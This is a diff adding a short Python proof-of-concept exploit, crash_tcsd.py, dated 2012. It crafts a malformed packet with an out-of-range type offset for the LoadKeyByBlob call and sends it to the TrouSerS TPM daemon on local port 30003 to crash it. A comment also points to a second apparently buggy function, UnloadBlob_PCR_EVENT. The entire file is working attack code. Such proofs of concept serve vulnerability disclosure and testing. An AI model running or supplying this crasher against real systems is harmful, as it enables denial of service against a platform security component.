@@ -1,0 +1,27 @@
+# crash_tcsd.py
+# Copyright (c) 2012 Andy Lutomirski.  All rights reserved.
+#
+# Permission is granted to anyone to copy and redistribute this file verbatim.
+# Permission is *not* granted to distribute modified copies or derivative works.
+
+import struct
+import socket
+import time
+
+# UnloadBlob_PCR_EVENT also appears buggy.
+
+crasher = struct.pack('>IIIIIII',
+                      28, # packet_size = sizeof(tcsd_packet_hdr)
+                      11, # ordinal: LoadKeyByBlob
+                      1, # num_parms = 1 (so first getData doesn't bail)
+                      0, # type_size = 0
+                      0x80000000, # type_offset is off in lala land
+                      0, # parm_size = 0 (skip checking)
+                      28, # parm_offset: see getTCSDPacket
+                      )
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
+s.connect(('127.0.0.1', 30003))
+s.send(crasher)
+s.shutdown(socket.SHUT_WR)
+s.close()
